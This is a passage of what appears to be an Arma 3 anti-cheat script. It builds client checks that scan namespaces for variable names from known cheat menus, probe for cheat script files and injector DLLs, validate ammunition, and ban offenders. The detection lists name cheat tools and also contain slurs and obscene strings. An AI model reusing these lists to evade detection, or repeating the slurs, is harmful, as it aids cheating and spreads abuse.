[] spawn "+_AHKickOFF+";                                                                                          };                                                                                    } forEach _verybadStrings;                                                                              };                                                                        };                                                                  };                                                            } forEach _allCtrls;                                                      } forEach allDisplays;                                                };                                                _tempcountallDisplays = count allDisplays;                                                uiSleep 1;                                          };                                    };                              "; }; _A3AHstring = _A3AHstring + "                              "; if(_UV2)then { _A3AHstring = _A3AHstring + "                                    [_name,_puid] spawn {                                          _name = _this select 0;                                          _puid = _this select 1;                                          _verybadStrings = "+str _verybadStrings+";                                          _allRandomGenVars = "+str _allRandomGenVars+";                                          while {1 == 1} do                                          {                                                _timer1 = time;                                                                                                _allmissionNamespaceVars = (allVariables missionNamespace);                                                _allmissionNamespaceVars = _allmissionNamespaceVars - ['pvah_adminreq'];                                                _allmissionNamespaceVars = _allmissionNamespaceVars - ['fnc_ammoforvehicles'];                                                _allmissionNamespaceVars = _allmissionNamespaceVars - ['bpdcode'];                                                {_allmissionNamespaceVars = _allmissionNamespaceVars - [_x];} forEach _allRandomGenVars;                                                {                                                      _m = missionNamespace getVariable _x;                                                      if(!isNil '_m')then                                                      {                                                            _var = _x;                                                            _varLow = toLower _x;                                                            _varcontent = toLower(str _m);                                                            {                                                                  if(_varLow find _x > -1)then                                                                  {                                                                        _log = format['BadVar: %1   found: %2   (set _UV2 = false; in run.sqf if this bothers you.)',_var,_x];                                                                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                                  "; if(_V2C)then { _A3AHstring = _A3AHstring + "                                                                        _fid = _varcontent find _x;                                                                        if(_fid > -1)then                                                                        {                                                                              _log = format['BadVarContent: %1   found: %2   %3   (set _V2C = false; in run.sqf if this bothers you.)',_var,_x,_varcontent select [_fid,(_fid+150)]];                                                                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  "; }; _A3AHstring = _A3AHstring + "                                                            } forEach _verybadStrings;                                                      };                                                } forEach _allmissionNamespaceVars;                                                                                                _sleeptimer = ((time - _timer1)*2)+5;                                                uiSleep _sleeptimer;                                          };                                    };                              "; }; _A3AHstring = _A3AHstring + "                              "; if((_UBV)||(_UBF))then { _A3AHstring = _A3AHstring + "                                    [_name,_puid,_admins] spawn {                                          _name = _this select 0;                                          _puid = _this select 1;                                          _admins = _this select 2;                                          "; if(_UBV)then { _A3AHstring = _A3AHstring + "                                          _badVariables =                                          [                                                'FND_fnc_subs','setcash','Dummy_Ghost','entf','check_loaded','mein1','LY_Menu',                                                'showcommandingMenu','disableUserInput','local','forEach','nearEntities','round','onEachFrame','a','imgoingnukeyou','fnc_usec_damageHandler',                                                'Status_BB','TZ_BB_A3','TZ_BB_KB_Hint','TZ_BB_BindHandler','AH_BRAZZERS_TZ_BB','kamakazi_lystic','fuckfest','LYSTIC_MENU_LOADED','D_AMEZ_COA',                                                'Intro','Repair','Heal','T3le','TNK','I_like_turtles','BIGM','GMod','E3p','Does_Tonic_Like_to_take_Turtle_penis_in_the_ass_LODESTARS',                                                'lel','vars','PSwap','toLower_new','BCast','thfile','tlmadminrq','infiSTARBLACK','carepkg','scrollAim','BlurExec','sbpc','CALLRE',                                                'quake','menu_run','ZedProtect','actid1','vehicles1','MapClicked','MapClickedPosX','MouseUpEvent','scrollPlayerlist','keypress_xxx','D_AMEZ_COA',                                                'envi','G_A_N_G_S_T_A','ZoombiesCar','timebypass','returnString_z','isori','tangrowth27','PVAH_AdminRequest','AH_OFF_LOL','b','infiSTAR_fillRE',                                                'qwak','infoe','font','title_dialog','sexymenu_adds_Star','boolean_1','initre337','skype_option','bleh','magnetomortal','fnc_allunits','sbp',                                                'PV_IAdminMenuCode','PVAH_WriteLogRequest','skype_img','Lhacks','Lpic','LtToTheRacker','Lexstr','take1','Called','epochExec','sdgff4535hfgvcxghn',                                                'adadawer24_1337','fsdddInfectLOL','W_O_O_K_I_E_Car_RE','kW_O_O_K_I_E_Go_Fast','epchDeleted','lystobindkeys','lystoKeypress','fnc_usec_unconscious',                                                'toggle_1','shiftMenu','dbClicked','b_loop','re_loop','v_bowen','bowen','melee_startAttack','asdasdasd','antihax2','PV_AdminMenuCode','AdminLoadOK',                                                'AdminLoadOKAY','PV_TMPBAN','T_o_g_g_l_e_BB','fixMenu','PV_AdminMenuCodee','AdminPlayer','PVAH_AdminRequestVariable','epochBackpack','JME_Red',                                                'JME_MENU_Sub','JME_menu_title','JME_Sub','JME_OPTIONS','god','heal','grass','fatguybeingchasedbyalion','night','day','infammo','nvg','thermal',                                                'Keybinds','fredtargetkill','loopfredtpyoutome','epochTp','AdminLst','BB_Pr0_Esp','BBProEsp','epochMapMP','CALLRESVR','EPOCH_spawnVehicle_PVS',                                                'adminlite','adminlitez','antihacklite','bp','inSub','scroll_m_init_star','markerCount','zombies','startmenu_star','LystoDone','MOD_EPOCH',                                                'Admin_Lite_Menu','admingod','adminESPicons','fnc_MapIcons_infiSTAR','BIS_MPF_remoteExecutionServer4','adminadd','shnext','infiSTAR_fill_Weapons',                                                'adminZedshld','adminAntiAggro','admin_vehicleboost','admin_low_terrain','admin_debug','admincrate','exstr','nlist','PV_AdminMainCode','TPCOUNTER',                                                'PVDZ_Hangender','fn_filter','vehiList','Remexec_Bitch','zeus_star','igodokxtt','tmmenu','AntihackScrollwheel','survcam','infiniteammo','PVAH_AHTEMPBAN',                                                'lalf','toggle','iammox','telep','dayzlogin3','dayzlogin4','changeBITCHinstantly','antiAggro_zeds','BigFuckinBullets','abcdefGEH','adminicons',                                                'fn_esp','aW5maVNUQVI_re_1','passcheck','isInSub','qodmotmizngoasdommy','ozpswhyx','xdistance','wiglegsuckscock','diz_is_real__i_n_f_i_S_T_A_R',                                                'pic','veh','unitList','list_wrecked','addgun','ESP','BIS_fnc_3dCredits_n','dayzforce_save','ViLayer','blackhawk_sex','activeITEMlist','items1',                                                'adgnafgnasfnadfgnafgn','Metallica_infiSTAR_hax_toggled','activeITEMlistanzahl','xyzaa','iBeFlying','rem','DAYZ_CA1_Lollipops','HMDIR','vehC',                                                'HDIR','carg0d','init_Fncvwr_menu_star','altstate','black1ist','ARGT_JUMP','ARGT_KEYDOWN','ARGT_JUMP_w','ARGT_JUMP_a','bpmenu','color_black',                                                'p','fffffffffff','markPos','pos','TentS','VL','MV','monky','qopfkqpofqk','monkytp','pbx','nametagThread','spawnmenu','sceptile15','sandshrew',                                                'mk2','i','j','v','fuckmegrandma','mehatingjews','TTT5OptionNR','zombieDistanceScreen','cargodz','R3m0te_RATSifni','wepmenu','admin_d0','RAINBOWREMEXECVEH',                                                'omgwtfbbq','namePlayer','thingtoattachto','HaxSmokeOn','testIndex','g0d','spawnvehicles_star','kill_all_star','sCode','dklilawedve','peter_so_fly_CUS',                                                'selecteditem','moptions','delaymenu','gluemenu','g0dmode','cargod','infiSTAR_fillHax','itemmenu','gmadmin','fapEsp','mapclick','VAGINA_secret',                                                'spawnweapons1','abcd','skinmenu','playericons','changebackpack','keymenu','godall','theKeyControl','infiSTAR_FILLPLAYER','whitelist','pfEpochTele',                                                'custom_clothing','img','surrmenu','footSpeedIndex','ctrl_onKeyDown','plrshldblcklst','DEV_ConsoleOpen','executeglobal','cursoresp','Asdf','planeGroup',                                                'teepee','spwnwpn','musekeys','dontAddToTheArray','morphtoanimals','aesp','LOKI_GUI_Key_Color','Monky_initMenu','tMenu','recon','curPos',                                                'playerDistanceScreen','ihatelife','debugConsoleIndex','MY_KEYDOWN_FNC','pathtoscrdir','Bowen_RANDSTR','ProDayz','idonteven','walrein820','RandomEx',                                                'TAG_onKeyDown','changestats','derp123','heel','rangelol','unitsmenu','xZombieBait','plrshldblckls','ARGT_JUMP_s','ARGT_JUMP_d','globalplaya','ALL_MAGS_TO_SEARCH',                                                'shnmenu','xtags','pm','lmzsjgnas','vm','bowonkys','glueallnigga','hotkeymenu','Monky_hax_toggled','espfnc','playeresp','zany','dfgjafafsafccccasd',                                                'atext','boost','nd','vspeed','Ug8YtyGyvguGF','inv','rspwn','pList','loldami','T','bowonky','aimbott','Admin_Layout','markeresp','allMrk','MakeRandomSpace',                                                'helpmenu','godlol','rustlinginit','qofjqpofq','invall','initarr','reinit','byebyezombies','admin_toggled','fn_ProcessDiaryLink','ALexc','DAYZ_CREATEVEHICLE',                                                'Monky_funcs_inited','FUK_da_target','damihakeplz','damikeyz_veryhawt','mapopt','hangender','slag','jizz','kkk','ebay_har','sceptile279','TargetPlayer',                                                'tell_me_more_infiSTAR','airborne_spawn_vehicle_infiSTAR','sxy_list_stored','advert_SSH','antiantiantiantih4x','Flare8','Flare7','SuperAdmin_MENU',                                                'bl4ck1ist','keybinds','actualunit','mark_player','unitList_vec','yo2','actualunit_vec','typeVec','mark','r_menu','hfghfg','vhnlist','work','Intro',                                                'yo3','q','yo4','k','cTargetPos','cpbLoops','cpLoopsDelay','Flare','Flare1','Flare2','Flare3','Flare4','Flare5','Flare6','kanghaskhan','palkia',                                                'eExec_commmand','cockasdashdioh','fsdandposanpsdaon','antiloop','anti','spawn_explosion_target_ebay','whatisthis4','ratingloop_star','epochRemoteNukeAll',                                                'PVAH_admin_rq','PVAH_writelog_rq','sandslash','muk','pidgeotto','charmeleon','pidgey','lapras','LYST1C_UB3R_L33T_Item','MathItem','fapLayer','cooldown',                                                'raichu','infiSTAR_chewSTAR_dayz_1','infi_STAR_output','infi_STAR_code_stored','keybindings','keypress','menu_toggle_on','dayz_godmode','aiUnit',                                                'MENUTITLE','wierdo','runHack','Dwarden','poalmgoasmzxuhnotx','ealxogmniaxhj','firstrun','ohhpz','fn_genStrFront','shazbot1','cip','Armor1','GMod',                                                'kickable','stop','possible','friendlies','hacks','main','mapscanrad','maphalf','DelaySelected','SelectDelay','GlobalSleep','vehD','ALL_WEPS_TO_SEARCH',                                                'jopamenu','ggggg','tlm','Listw','toggle_keyEH','infammoON','pu','chute','dayzforce_savex','PVDZ_AdminMenuCode','PVDZ_SUPER_AdminList','DarkwrathBackpack',                                                'PVDZ_hackerLog','BP_OnPlayerLogin','material','mapEnabled','markerThread','addedPlayers','playershield','spawnitems1','sceptile27','Proceed_BB',                                                'ESPEnabled','wpnbox','fnc_temp','MMYmenu_stored','VMmenu_stored','LVMmenu_stored','BIS_MPF_ServerPersistentCallsArray','PV_CHECK','admin_animate1',                                                'patharray','ZobieDistanceStat','infiSTARBOTxxx','keyspressed','fT','tpTarget','HumanityVal','yanma','absol','SimpleMapHackCount','keyp',                                                'aggron','magazines_spawn','weapons_spawn','backpack_spawn','backpackitem_spawn','keybindings_exec','keypress_exec','MajorHageAssFuckinfBulletsDude',                                                'Wannahaveexplosivesforbullets','TheTargetedFuckingPlayerDude','haHaFuckAntiHakcsManIbypasDatShit','aintNoAntiHackCatchMyVars','objMYPlayer',                                                'Awwwinvisibilty','vehiclebro','wtfyisthisshithere','terrainchangintime','Stats','menu','ssdfsdhsdfh','onisinfiniteammobra','youwantgodmodebro',                                                'yothefuckingplayerishere','Namey','sendmsg12','jkh','DELETE_THIS','move_forward','leftAndRight','forwardAndBackward','upAndDown','distanceFromGround',                                                'hoverPos','bulletcamon','cheatlist','espOn','removegrass','timeday','infammo','norekoil','nocollide','esp2ez','fastwalk','entupautowalk',                                                'BensWalker','dropnear','executer','killme','magnetmenu','loadmain','magnet','loadMenu','refreshPlayers','ALREADYRAN','players','BigBenBackpack',                                                'sendMessage','newMessage','W34p0ns','amm0','Att4chm3nt','F0od_Dr1nk','M3d1c4l','T0ol_it3ms','B4ckp4cks','It3m5','Cl0th1ng','walkloc','nwaf','cherno',                                                'cherno_resident','cherno_resident_2','dubky','oaks','swaf','swmb','getX','PlayerShowDistance','M_e_n_u_2','colorme','keybindloop','Tractor_Time',                                                'murkrow','noctowl','isExecuted','piloswine','AddPlayersToMap','markers','miltank','GearAdd','GearRemove','Malvsm','Malcars','malfly','keyForward',                                                'PermDialogSelected','TempDialogSelected','AdminDialogList','pfKeygen','pfScanUnits','pfPickPlayer','pfshnext','pfnlist','pfselecteditem','pfshnmenu',                                                'pfPlayerMonitor','pfPlayersToMonitor','pfShowPlayerMonitor','pfPlayerMonitorMutex','marker','JJJJ_MMMM___EEEEEEE_INIT_MENU','E_X_T_A_S_Y_Init_Menu',                                                'monkaiinsalt','monkaiin','part88','adminKeybinds','PV_DevUIDs','fapEspGroup','Repair','RepairIT','rainbowTarget','rainbowTarget1','rainbowTarget2',                                                'rainbowTarget3','letmeknow','VehicleMenue','Menue_Vehicle','my_anus_hurtz','life_no_injection','Tonic_has_a_gaping_vagina','teletoplr','telet',                                                'ygurv1f2','BIGM','E3p','T3le','fnc_PVAH_AdminReq','infiSTAR_MAIN_CODE','MAIN_CODE_INJECTED','D34DXH34RT_E5P','Arsenal','Jme_Is_God','B0X_CANN0N_T0GGLE',                                                'PL4YER_CANN0N_T0GGLE','aim','HOLY_FUCK_FDKFHSDJFHSDKJ_vehicles_m','lazy_ILHA_is_lazy','POOP_Item','die_menu_esp_v1','XXMMWW_main_menu','MM_150',                                                'BIS_tracedShooter','JME_HAS_A_GIANT_DONG','nuke_vars','nukepos','fuckfest','fuckfestv2','FAG_NEON','Deverts_keyp','jfkdfjdfjdsfjdsfjkjflfjdlfjdlfjru_keyp',                                                'eroticTxt','asdadaio9d0ua298d2a0dza2','trap','boomgoats','morphme','morph','blfor','blfor2','blfor3','rdfor','rdfor2','rdfor3','napa','civ',                                                'Detected_Remote_Execution','keybindz','PEDO_IS_FUKED','MAINON','PLAYERON','PLAYEROFFNEXT1','PLAYERNEXT2','ALTISLIFEON','ALTISLIFEOFFNEXT1','ALTISLIFENEXT2',                                                'ALTISLIFEOFFNEXT2','ALTISLIFENEXT3','FUNMENUON','FUNMENUOFFNEXT1','FUNMENUNEXT2','FUNMENUOFFNEXT2','FUNMENUNEXT3','MAINOFF','PLAYEROFF','ALTISLIFEOFF',                                                'FUNMENUOFF','H4X_Miriweth_Menu_Click_Hax','IrEcOCMmeNEnd_God_MODE','TTTT_IIII___TTTTTTT_REPGAs','EC_GOD_TOGGLE','admin_d0_server','PedoMazing_Friends',                                                'ly5t1c','JJMMEE_Swagger','Bobsp','Speed_Hack_cus','pList_star_peter_cus','RGB','neo_throwing','Blue_I_Color_LP','box','bombs',                                                'Orange_I_Color_LP','Menu_I_On_Color_LP','Menu_I_Off_Color_LP','Speed_Hack_cus','cus_SPEED_DOWN','pnc','SpyglassFakeTrigger','infammook','input_text',                                                'Tit_Choppertimer','GLASS911_Executer_for_menu','E5P','ThirtySix_Unlim_Ammo','ThirtySix_God','JJMMEE_INIT_MENU','menuheader','life_fnc_sessionUpdateCalled',                                                'blu_t_color_LP','FAG_RedSoldiers','titles_n_shit','eXecutorr','menu_headers','player_list','refresh_players','fn_loadMap','weapon_list','vehicle_list','get_display',                                                'create_display','CTRL_BTN_LIST','execMapFunc','mapFunc','OPEN_LISTS','init_menu','biggies_white_tex','Abraxas_Unl_Life','Abraxas_Life','waitFor','Mystic_ESP',                                                'biggies_menu_open','scriptex3cuter','rym3nucl0s3','eses_alis','PersonWhomMadeThisCorroded_Menu','Flo_Simon_KillPopUp','keybindz2','text_colour','key_combos_ftw',                                                'PlayerInfiniteAmmo','Im_a_Variable','aaaa','fnc_LBDblClick_RIGHT','OMFG_MENU','N_6','RscCombo_2100_mini','RscListbox_1501_mini','andy_suicide',                                                'JxMxE_hide','JME_Keybinds','JME_has_yet_to_fuck_this_shit','JME_deleteC','JME_Tele','JME_ANAL_PLOW','JME_M_E_N_U_initMenu','JME_M_E_N_U_hax_toggled','W_O_O_K_I_E_FUD_Pro_RE','W_O_O_K_I_E_FUD_Car_RE','W_O_O_K_I_E_FUD_Car_RE',                                                'JxMxE_Veh_M','JxMxE_LifeCash500k','W_O_O_K_I_E_FUD_FuckUp_GunStore','W_O_O_K_I_E_FUD_M_E_N_U_initMenu','W_O_O_K_I_E_FuckUp_GunStore_a','JME_KillCursor','JME_OPTIONS','JME_M_E_N_U_fill_TROLLmenu','ASSPLUNGE','FOXBYPASS','POLICE_IN_HELICOPTA',                                                'JxMxE_EBRP','W_O_O_K_I_E_M_E_N_U_funcs_inited','Menu_Init_Lol','E_X_T_A_S_Y_Atm','W_O_O_K_I_E_Pro_RE','W_O_O_K_I_E_Debug_Mon','W_O_O_K_I_E_Debug_1337','Veh_S_P_A_W_N_Shitt','sfsefse','tw4etinitMenu','tw4etgetControl',                                                'JxMxEsp','JxMxE_GOD','JxMxE_Heal','efr4243234','sdfwesrfwesf233','sdgff4535hfgvcxghn','adadawer24_1337','lkjhgfuyhgfd','E_X_T_A_S_Y_M_E_N_U_funcs_inited','dayz_serverObjectMonitor','fsfgdggdzgfd','fsdddInfectLOL','Wookie_List',                                                'JxMxE_TP','Wookie_Pro_RE','Wookie_Car_RE','Wookie_Debug_Mon','faze_funcs_inited','advertising_banner_infiSTAR','atext_star_xa','Monky_hax_dbclick','qopfkqpofqk','debug_star_colorful','AntiAntiAntiAntiHax','antiantiantiantih4x',                                                'JxMxE_Infect','hub','scrollinit','gfYJV','Lystic_LMAOOOOOOOOOOOOOOOOOOO','Lystic_Re','Lysto_Lyst','E_X_T_A_S_Y_Keybinds','Menulocations','Lystic_Init','scroll_m_init_star','exstr1','pathtoscrdir3','Monky_funcs_inited',                                                'JxMxE_secret','Monky_initMenu','player_zombieCheck','E_X_T_A_S_Y_Recoil','godlol','playericons','abcdefGEH','wierdo','go_invisible_infiSTAR','serverObjectMonitor','enamearr','initarr3','locdb','sCode','infAmmoIndex',                                                'nukeDONEstar','Wookie_List','Wookie_Pro_RE','FUCKTONIC','E_X_T_A_S_Y_FuckUp_GunStore_a','E_X_T_A_S_Y_Cash_1k_t','E_X_T_A_S_Y_Cash_a','E_X_T_A_S_Y_LicenseDrive','E_X_T_A_S_Y_Menu_LOOOOOOOOOL','Metallica_vehicleg0dv3_infiSTAR',                                                'JJJJ_MMMM___EEEEEEE_INIT_MENU','JJJJ_MMMM___EEEEEEE_GAPER','JJJJ_MMMM___EEEEEEE_SMOKExWEEDxEVERYDAY_BUM_RAPE','JJJJ_MMMM___EEEEEEE_OPTIONS','JJJJ_MMMM___EEEEEEE_M_E_N_U_fill_Target','E3p',                                                'Jesus_MODE','ESP','MissileStrike','AL_Liscenses','NoIllegal','NoWeight','m0nkyaatp_sadksadxa','m0nkyaatp_RANDSTR','myvar23','player_adminlevel','TNK','I_like_turtles',                                                'BIGM','Does_Tonic_Like_to_take_Turtle_penis_in_the_ass_LODESTARS','Does_Tonic_Like_to_take_Turtle_penis_in_the_ass_LODESTAR1','GMod','No_No_No_Tonic_likes_A_Big_Fat_Sheep_Cock_Right_in_the_bum_G0d_Mode',                                                'Sload','T3le','life_no_injection','Tonic_has_a_gaping_vagina','my_anus_hurtz','aKFerm','aKMMenu','aKTitans','aKLikeaG0d','riasgremory_G0d_Mode','aKCarG0d','riasgremory_Car_Jesus','aKE5p','riasgremory_isseilol','aKPMark',                                                'riasgremory_Noobs','riasgremory_Bitches','riasgremory_Map_Markers','aKUnMmo','jenesuispasuncheateur_unamo','aKVoit','Loljesaispasquoiecriremdr','isseigremory','gremorysama','aKTaCu','aKCardetroy','aKGetKey','aKKillcursor',                                                'aKNoEscort','aKEscort','aKtroll','aKTPall','aKUnrestrain','aKNoEscortMe','aKNoTaze','aKJailplayer','aKLisense','riasgremory_titans_shit_reold','Tonic_merde','jaimepaslepoisin_HLEAL','TTTT_IIII___TTTTTTT_RAP_FR','TTTT_IIII___TTTTTTT_REPGA',                                                'TTTT_IIII___TTTTTTT_REPGAs','jaimepaslepoisin_HLEAL','Root_Main4','Root_Pistol4','Root_Rifle4','Root_Machinegun4','Root_Sniper4','Root_Launcher4','Root_Attachement4',                                                'VAR56401668319_secret','myPubVar','JJJJ_MMMM___EEEEEEE_LLYYSSTTIICCC_SHIT_RE','XXMMWW_boxquad','Init_Menu_Fury','A3RANDVARrpv1tpv','fnc_nestf','XXMMWW_keybinds'                                          ];                                          if(_puid in _admins)then                                          {                                                {                                                      _missionNamespace = missionNamespace getVariable _x;                                                      if(!isNil '_missionNamespace')then                                                      {                                                            missionNamespace setVariable[_x,nil];                                                      };                                                      _uiNamespace = uiNamespace getVariable _x;                                                      if(!isNil '_uiNamespace')then                                                      {                                                            uiNamespace setVariable[_x,nil];                                                      };                                                      _profileNamespace = profileNamespace getVariable _x;                                                      if(!isNil '_profileNamespace')then                                                      {                                                            profileNamespace setVariable[_x,nil];                                                      };                                                } forEach _badVariables;                                                saveProfileNamespace;                                          };                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_UBF)then { _A3AHstring = _A3AHstring + "                                          _filechecktimer = time;                                          _txtsqfA =                                          [                                                '1.sqf','3.sqf','qa.sqf','gknova61_money.sqf','invi.sqf','Krypto.sqf','Dta\mhm.sqf','Newscroll.sqf',                                                'test\jude\3dollar\blub.sqf','lel.sqf','_src\Load.sqf','scripts\jmepoch.sqf','Det\Test.sqf','test\mhm.sqf',                                                'Jowin.sqf','FreundeMod\altea.sqf','dracau18scripts.sqf','CraftLourens.sqf','My Menu Collection\Wookie\mongoose.sqf',                                                'menu\menuext.sqf','LystoArma3\Lystic.sqf','LystoArma3\antiantihax.sqf','rouvenk.sqf','chub\start.sqf','Whippy\playerTools.sqf',                                                'rouven33.sqf','Addons\temp.sqf','hihi.sqf','test.sqf','\Life41337\init.sqf','swagre.sqf','huki.sqf','y.sqf',                                                'Dta\nom.sqf','AnalFuckMeOnATable.sqf','JH\Action.sqf','V4Run.sqf','_src\test.sqf','ScriptName.sqf','999999999999999999999999999.sqf',                                                'RommelV1\Rexecv1.sqf','abra.sqf','jmepochV2.sqf','FuryV3.sqf','69.sqf','_src\menu1.sqf','_src\keybinds.sqf','porno.sqf',                                                'RhynoV1\RJZSexecutev4.sqf','RJZSexecv4.sqf','ArmA2OA_Extars\BB_menu_BB.sqf','LystoArma3\start.sqf','ammobox.sqf','temp.sqf',                                                'v102.sqf','jestersMENU\jester@start.sqf','uc.sqf','semClient.sqf','FireTide.sqf'                                          ];                                          {_txtsqfA pushBack format['%1.sqf',_x];} forEach [0,1,2,3,4,5,6,7,8,9,10,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];                                          _otherA =                                          [                                                'debug_console.dll','debug_consolee.dll','tbb4malloc_bi.dll','Xenos.exe','Xenos64.exe','fraps.dll','youtube.dll','_CommonRedist\DirectX\Config.cab',                                                'DirectX\Config.cab','G-e-F_Menu\StartGeF.dta','Bonus\Soundtrack\Win\12_Wins.dta','_CommonRedist\DirectX\Jun2010\Apr2005_d3dx9_24_x64.cab',                                                'Bonus\Soundtrack\clickSound.ogg','G-e-F_Menu\G-e-F_HackConfig.ini','Launcher\kernel_x86.dll','DLL\DatMalloc.dll','\G-e-F_HackConfig.ini',                                                'Dta\Screens.bin'                                          ];                                          "; }; _A3AHstring = _A3AHstring + "                                                                                    uiNamespace setVariable ['bis_fnc_diagkey',{}];                                          while {1 == 1} do                                          {                                                _bis_fnc_diagkey = uiNamespace getVariable ['bis_fnc_diagkey',{}];                                                if(str _bis_fnc_diagkey != '{}')then                                                {                                                      _log = format['bis_fnc_diagkey changed: %1',_bis_fnc_diagkey];                                                      [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                                                                _timer1 = time;                                                "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                _avpnamespace = (allVariables parsingNamespace);                                                if!(_avpnamespace isEqualTo [])then                                                {                                                      _log = format['BadVariables in parsingNamespace: %1',_avpnamespace];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                "; }; _A3AHstring = _A3AHstring + "                                                "; if(_UBF)then { _A3AHstring = _A3AHstring + "                                                if(_filechecktimer < time)then                                                {                                                      _filechecktimer = time + 300;                                                      diag_log 'IGNORE THIS';                                                      diag_log '--------------------------------------------------';                                                      preProcessFileLineNumbers 'Done! badcontent.sqf';                                                      {                                                            _f = preprocessFileLineNumbers _x;                                                            if(_f != '')then                                                            {                                                                  _log = format['BadFile1: %1 - %2',_x,_f];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                            uiSleep 0.1;                                                      } forEach _txtsqfA;                                                      {                                                            _f = preprocessFileLineNumbers _x;                                                            if(_f != '')then                                                            {                                                                  _log = format['BadFile2: %1',_x];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                            uiSleep 0.1;                                                      } forEach _otherA;                                                      diag_log '--------------------------------------------------';                                                };                                                "; }; _A3AHstring = _A3AHstring + "                                                "; if(_UBV)then { _A3AHstring = _A3AHstring + "                                                {                                                      _vc = missionNamespace getVariable _x;                                                      if(!isNil _x)then                                                      {                                                            _log = format['BadVar: %1 - %2',_x,_vc];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      }                                                      else                                                      {                                                            if(!isNil '_vc')then                                                            {                                                                  _log = format['BadVar in missionNamespace: %1 - %2',_x,_vc];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                      };                                                      _vc = uiNamespace getVariable _x;                                                      if(!isNil '_vc')then                                                      {                                                            _log = format['BadVar in uiNamespace: %1 - %2',_x,_vc];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                      _vc = profileNamespace getVariable _x;                                                      if(!isNil '_vc')then                                                      {                                                            profileNamespace setVariable[_x,nil];saveProfileNamespace;                                                            _log = format['BadVar in profileNamespace: %1 - %2',_x,_vc];                                                            [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                } forEach _badVariables;                                                "; }; _A3AHstring = _A3AHstring + "                                                _sleeptimer = ((time - _timer1)*2)+1;                                                uiSleep _sleeptimer;                                          };                                    };                              "; }; _A3AHstring = _A3AHstring + "                              "+_AH_RunCheckARRAY+" pushBack 2;                        };                        if!(3 in "+_AH_RunCheckARRAY+")then                        {                              [_name,_puid] spawn {                                    disableSerialization;                                    _name = _this select 0;                                    _puid = _this select 1;                                    "+_infiSTAR_fnc_animchanged+" = compileFinal '                                          if((_this select 1) in [''AmovPercMstpSnonWnonDnon_exerciseKata'',''AmovPercMstpSnonWnonDnon_exercisePushup'',''GestureSpasm1'',''GestureSpasm4'',''GestureNod''])exitWith {                                                player playMoveNow ''Unconscious'';                                                {player setHitPointDamage [_x,1];} forEach [''HitBody'',''HitHead''];                                          };                                    ';                                    _kdID = 0;                                    _kdID_F = 0;                                    if("+str _RCK+")then {(findDisplay 46) displayRemoveAllEventHandlers 'KeyDown';};                                    "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                          fnc_inventoryClosed = compileFinal '                                                if(!isNil ''EPOCH_arr_interactedObjs'')then {                                                      if!(EPOCH_arr_interactedObjs isEqualTo [])then {                                                            EPOCH_S_S_VEHICLES = EPOCH_arr_interactedObjs;                                                            publicVariableServer ''EPOCH_S_S_VEHICLES'';                                                            EPOCH_arr_interactedObjs = [];                                                      };                                                };                                          ';                                    "; }; _A3AHstring = _A3AHstring + "                                    _FiredCheck = {                                          _unit = _this select 0;                                          _weapon = _this select 1;                                          _muzzle = _this select 2;                                          _mode = _this select 3;                                          _ammo = _this select 4;                                          _magazine = _this select 5;                                          _projectile = _this select 6;                                          if(("+str _UFA+") && {((!("+str _UAW+") && {_ammo in "+str _ForbiddenAmmo+"}) || (("+str _UAW+") && {!(_ammo in "+str _AmmoWhiteList+")}))})then                                          {                                                _log = format['ForbiddenAmmo: %1 with weapon %2',_ammo,_muzzle];                                                [profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          if(_unit isEqualTo player)then                                          {                                                if!(_muzzle in ['','Throw','Flare','Put'])then                                                {                                                      if((toLower _magazine) find '3rnd_' == -1)then                                                      {                                                            _ammo_checkpassed = true;                                                            _lowAmmo = toLower _ammo;                                                            {if(_lowAmmo find _x > -1)exitWith {_ammo_checkpassed = false;};} forEach ['f_40mm','f_20mm','g_40mm','g_20mm','spear_'];                                                            if(_ammo_checkpassed)then                                                            {                                                                  _cfgammo = getText(configFile >> 'CfgMagazines' >> _magazine >> 'ammo');                                                                  if(_ammo != _cfgammo)then                                                                  {                                                                        player removeItem _muzzle;                                                                        player removeWeapon _muzzle;                                                                        player removeMagazines _magazine;                                                                        _log = format['BadMuzzle: %1 with weapon %2',_ammo,_muzzle];                                                                        [profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                                                                                                    _maxAmmo = getNumber (configFile >> 'CfgMagazines' >> _magazine >> 'count');                                                                  if(_maxAmmo > 1)then                                                                  {                                                                        if(isNil '"+_lastshotmade+"')then {"+_lastshotmade+" = time;};                                                                        if(typeName "+_lastshotmade+" != 'SCALAR')then                                                                        {                                                                              _log = 'BadDefinition: -no ammo loss- check bypass!';                                                                              [profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                        if(time - "+_lastshotmade+" > 0.2)then                                                                        {                                                                              _camm = player ammo _muzzle;                                                                              if((_camm >= _maxAmmo)&&(_muzzle 